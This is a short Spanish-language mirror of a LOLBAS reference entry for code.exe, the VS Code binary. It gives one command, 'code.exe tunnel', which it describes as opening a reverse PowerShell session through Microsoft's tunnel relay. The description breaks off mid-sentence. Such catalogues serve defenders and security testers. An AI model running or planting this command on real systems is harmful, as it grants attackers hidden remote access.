# LOLBAS: code.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

VSCode binary, also portable (CLI) version

## Comandos

### Reverse PowerShell session over MS provided infrastructure.

Execute · priv: User · T1219.001

```cmd
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```

Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command

